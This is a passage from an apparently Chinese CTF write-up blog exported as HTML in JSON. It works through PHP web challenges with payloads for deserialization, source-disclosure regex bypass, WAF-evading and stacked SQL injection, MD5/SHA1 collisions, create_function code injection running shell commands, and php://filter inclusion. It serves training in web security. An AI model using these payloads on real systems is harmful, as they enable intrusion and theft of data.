class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br></pre></td></tr></table></figure>\n<p>payload1:(加 %00)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?w00m=O:4:&quot;w22m&quot;:1:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w33m&quot;:2:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w44m&quot;:2:&#123;s:11:&quot;%00w44m%00admin&quot;;s:4:&quot;w44m&quot;;s:9:&quot;%00*%00passwd&quot;;s:5:&quot;08067&quot;;&#125;s:4:&quot;w22m&quot;;s:7:&quot;Getflag&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>payload2:(直接用 url 编码后的)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>\n<h3 id=\"10easyp\"><a class=\"markdownIt-Anchor\" href=\"#10easyp\">#</a> 10.EasyP</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;utils.php&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;guess&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$guess</span> = (<span class=\"keyword\">string</span>) <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;guess&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$guess</span> === <span class=\"variable\">$secret</span>) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$message</span> = <span class=\"string\">&#x27;Congratulations! The flag is: &#x27;</span> . <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$message</span> = <span class=\"string\">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/utils\\.php\\/*$/i&#x27;</span>, <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;hacker :)&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/show_source/&#x27;</span>, <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;REQUEST_URI&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;hacker :)&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"title function_ invoke__\">basename</span>(<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>1. <code>$_SERVER['PHP_SELF']</code> <br>\n 返回的是当前正在执行的脚本的相对路径<br>\n 2.basename ()<br>\n 返回给定路径的最后一个组成部分，不包括查询参数和父目录，回当前执行的 PHP 脚本的文件名<br>\n eg.<br>\n![[Pasted image 20230428144618.png]]<br>\n![[Pasted image 20230428144802.png]]<br>\n <code>$_SERVER['REQUEST_URI']</code> <br>\n 包含了当前正在执行的脚本的相对路径以及任何查询字符串<br>\n！[[Pasted image 20230428145113.png]]<br>\n 怎么绕过呢？</p>\n<ol>\n<li>可以在 utils.php 后加一个字符，比如 % ff (非 ASCII 字符), 随便一个汉字给 url 编码就行，绕过第一个 preg_match 并且 basename () 无法处理非 ASCII 字符会直接获取 utils.php</li>\n<li>第二个正则绕过方式是加 Url 编码绕过，参数名至少需要一个或者以上进行 Url 编码或者 show.source, <code>show[source</code> <br>\npayload:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index.php/utils.php/%ff?show.source=1</span><br><span class=\"line\">index.php/utils.php/%ff?show[source=1</span><br><span class=\"line\">index.php/utils.php/%ff?%73how_source=1</span><br><span class=\"line\">index.php/utils.php/%E5%93%88(中文汉字哈的url编码)?show.source=1</span><br><span class=\"line\">........</span><br></pre></td></tr></table></figure>\n<h3 id=\"11swpuctf-2021-新生赛sql\"><a class=\"markdownIt-Anchor\" href=\"#11swpuctf-2021-新生赛sql\">#</a> 11.[SWPUCTF 2021 新生赛] sql</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?wllm=1 正常</span><br><span class=\"line\">?wllm=1&#x27; 报语法错误</span><br><span class=\"line\">?wllm=1&#x27;--+ 有waf,疑似过滤+,换了#发现也被过滤</span><br><span class=\"line\">?wllm=1&#x27;%23  正常,用url绕过</span><br><span class=\"line\">经过测试此题过滤了空格和等号</span><br><span class=\"line\">空格=&gt;/**/</span><br><span class=\"line\">等号=&gt;like</span><br><span class=\"line\">开始注入</span><br><span class=\"line\">?wllm=1&#x27;order/**/by/**/3%23  正常,4就错误,所以字段为3</span><br><span class=\"line\">?wllm=-1&#x27;union/**/select/**/1,2,3%23  回显位是2和3</span><br><span class=\"line\">?wllm=-1&#x27;union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/databse()%23</span><br><span class=\"line\">发现LTLT_flag(flag应该在这里),users</span><br><span class=\"line\">查列常规操作</span><br><span class=\"line\">得到id,flag,id,username</span><br><span class=\"line\">查内容这里只能看到前面,substr,right,reverse都被过滤,只能用mid截取(因为回显只能有20个，所以1次20个)</span><br><span class=\"line\">?wllm=-1&#x27;union/**/select/**/1,2,mid(group_concat(flag),1,20)/**/from/**/LTLT_flag%23</span><br><span class=\"line\">读三次(0,20)(20,20)(40,20)</span><br></pre></td></tr></table></figure>\n<h3 id=\"12随便注\"><a class=\"markdownIt-Anchor\" href=\"#12随便注\">#</a> 12. 随便注</h3>\n<p>字符型，过滤了 select,update,delete,drop,insert,where 和., 不区分大小写</p>\n<h4 id=\"116进制编码绕过\"><a class=\"markdownIt-Anchor\" href=\"#116进制编码绕过\">#</a> 1.16 进制编码绕过</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from `1919810931114514`</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span><br></pre></td></tr></table></figure>\n<p>payload1:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;SeT @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;</span><br></pre></td></tr></table></figure>\n<h4 id=\"2其他函数替代\"><a class=\"markdownIt-Anchor\" href=\"#2其他函数替代\">#</a> 2. 其他函数替代</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;handler `1919810931114514` open;handler `1919810931114514` read next;</span><br></pre></td></tr></table></figure>\n<h4 id=\"3alter注入\"><a class=\"markdownIt-Anchor\" href=\"#3alter注入\">#</a> 3.alter 注入</h4>\n<p>修改表名 <code>alter table 表名 rename 新表名;</code> <br>\n 修改字段名 <code>alter table 表名 change 旧字段名 新字段名 类型;</code> <br>\npayload:<br>\n 修改 words 表名为 words1<br>\n <code>alter table words rename words1;</code> <br>\n 修改 1919810931114514 表名为 words<br>\n <code>alter table 1919810931114514 rename words;</code> <br>\n 修改新的 words 表中的 flag 列名为 id<br>\n <code>alter table words change flag id varchar(60);</code> <br>\n 结合:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span><span class=\"string\">&#x27;;alter table words rename words1;alter table` 1919810931114514 `rename words;alter table words change flag id varchar(60);#</span></span><br></pre></td></tr></table></figure>\n<p>然后查 id=1 就行</p>\n<h3 id=\"13level-up\"><a class=\"markdownIt-Anchor\" href=\"#13level-up\">#</a> 13.level-up</h3>\n<p>先查看源代码发现这个注释</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- here is level 1 --&gt;</span><br><span class=\"line\">&lt;!-- disallow: --&gt;</span><br></pre></td></tr></table></figure>\n<p>说明要看 robots.txt, 发现 level_2_1s_h3re.php<br>\n (string) 用法:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$num</span> = <span class=\"number\">3</span>;</span><br><span class=\"line\"><span class=\"variable\">$str_num</span> = (<span class=\"keyword\">string</span>)<span class=\"variable\">$num</span>; <span class=\"comment\">// 结果: &quot;3&quot;，字符串类型</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$bool</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\"><span class=\"variable\">$str_bool</span> = (<span class=\"keyword\">string</span>)<span class=\"variable\">$bool</span>; <span class=\"comment\">// 结果: &quot;1&quot;，字符串类型</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$null_value</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"variable\">$str_null_value</span> = (<span class=\"keyword\">string</span>)<span class=\"variable\">$null_value</span>; <span class=\"comment\">// 结果: &quot;&quot;（空字符串），字符串类型</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$arr</span> = <span class=\"keyword\">array</span>(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>);</span><br><span class=\"line\"><span class=\"variable\">$str_arr</span> = (<span class=\"keyword\">string</span>)<span class=\"variable\">$arr</span>; <span class=\"comment\">// 结果: &quot;Array&quot;，字符串类型</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$obj</span> = <span class=\"keyword\">new</span> <span class=\"built_in\">stdClass</span>();</span><br><span class=\"line\"><span class=\"variable\">$obj</span>-&gt;name = <span class=\"string\">&quot;test&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$str_obj</span> = (<span class=\"keyword\">string</span>)<span class=\"variable\">$obj</span>; <span class=\"comment\">// 结果: &quot;stdClass Object&quot;，字符串类型</span></span><br></pre></td></tr></table></figure>\n<p>数组绕过失效，要 md5 强碰撞<br>\n payload:<br>\narray1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;array2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<br>\n<mark> 这里要用 burp 抓包改传参方式为 post 才可以，hackbar 不知道为什么没有用</mark><br>\n更多关于 md5 的绕过看我这篇博客<a href=\"https://hq185187.github.io/2023/04/30/md5/\"> md5</a><br>\n 找到 Level___3.php<br>\n 然后就是 sha1 的强碰撞，sha1 的绕过和 md5 几乎一样<br>\n下面给一个大佬的 sha1 强碰撞的 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>\n<p>然后得到 level_level_4.php<br>\nPHP 会将请求参数的非法字符转换成下划线 (空格，点)<br>\nNI+SA+=txw4ever<br>\n 拓展:<br>\nPHP 需要将所有参数转换成有效的变量名，因此再解析字符串时，会做两件事:</p>\n<ol>\n<li>删除空白符</li>\n<li>将某些字符串转换为下划线<br>\n加号 (%2b) 空格 (%20) 点号 (%2e) <code>[(%5b)</code>  和_(%5f)</li>\n</ol>\n<p>得到 55_5_55.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//sorry , here is true last level</span></span><br><span class=\"line\"><span class=\"comment\">//^_^</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;str.php&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;a&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;b&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>, <span class=\"variable\">$a</span>)) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$a</span>(<span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$b</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里要学一个新知识:create_function 代码注入</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?</span></span><br><span class=\"line\"><span class=\"variable\">$test</span>=<span class=\"title function_ invoke__\">create_function</span>(<span class=\"string\">&#x27;$a&#x27;</span>,<span class=\"string\">&#x27;$b&#x27;</span>,<span class=\"string\">&#x27;return($a+$b);&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">print_r</span>(<span class=\"variable\">$test</span>(<span class=\"number\">1</span>,<span class=\"number\">2</span>));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">相当于:</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\"><span class=\"variable\">$a</span>,<span class=\"variable\">$b</span></span>)</span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"variable\">$a</span>+<span class=\"variable\">$b</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>来个注入例子</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$test</span>=<span class=\"title function_ invoke__\">create_function</span>(<span class=\"string\">&#x27;$a&#x27;</span>,<span class=\"string\">&#x27;$b&#x27;</span>,<span class=\"string\">&#x27;return($a+$b);&#125;eval($_POST[&quot;a&quot;]);/*)</span></span><br><span class=\"line\"><span class=\"string\">相当于</span></span><br><span class=\"line\"><span class=\"string\">function test($a,$b)&#123;</span></span><br><span class=\"line\"><span class=\"string\">return($a+$b);&#125;</span></span><br><span class=\"line\"><span class=\"string\">eval($_POST[&quot;a&quot;]);/*</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>直接构造 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?a=\\create_function&amp;b=return &quot;1&quot;;)system(&quot;ls /&quot;);/*</span><br><span class=\"line\">?a=\\create_function&amp;b=return &quot;1&quot;;)system(&quot;cat /flag&quot;);/*</span><br></pre></td></tr></table></figure>\n<h3 id=\"14鹏城杯-2022简单包含\"><a class=\"markdownIt-Anchor\" href=\"#14鹏城杯-2022简单包含\">#</a> 14.[鹏城杯 2022] 简单包含</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag=php://filter/convert.base64-encode/resource=flag.php发现被过滤</span><br><span class=\"line\">flag=php://filter/convert.base64-encode/resource=index.php看源码</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$path</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;flag&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strlen</span>(<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;php://input&#x27;</span>)) &lt; <span class=\"number\">800</span> &amp;&amp; <span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/flag/&#x27;</span>, <span class=\"variable\">$path</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;nssctf waf!&#x27;</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    @<span class=\"keyword\">include</span>(<span class=\"variable\">$path</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>post 的数据里有有 flag 并且 &gt;=800<br>\npayload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=aaaa(800个a)&amp;flag=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>",
            "tags": []
        }
    ]
}